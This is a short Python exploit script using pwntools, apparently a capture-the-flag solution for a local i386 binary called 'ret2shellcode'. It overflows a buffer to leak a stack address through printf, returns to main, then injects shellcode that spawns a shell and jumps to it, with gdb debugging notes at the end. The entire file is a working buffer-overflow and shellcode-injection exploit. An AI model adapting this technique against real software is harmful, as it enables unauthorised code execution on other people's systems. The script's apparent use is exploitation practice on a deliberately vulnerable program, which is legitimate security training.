from pwn import *
context.arch="i386"
p = process("./ret2shellcode")
buf2 = 0x804A080
printf = p.elf.plt['printf']

main = p.elf.sym['main']
payload = b"%2$p"
payload = payload.ljust(0x70, b"\x00")


p.sendline(payload + p32(printf)+p32(main) + p32(buf2))
p.recvuntil(b"bye bye ~")
leak = int(p.recvuntil(b"No system for",drop=True), 16)
shellcode = leak - 0x88

payload = asm(shellcraft.sh())
payload = payload.ljust(0x68, b"\x00")

p.sendline(payload + p32(shellcode))
p.interactive()

# b *0x80485C0

# gef➤  p $esp
# $1 = (void *) 0xffe35420
# gef➤  p $ebp
# $2 = (void *) 0xffe354a0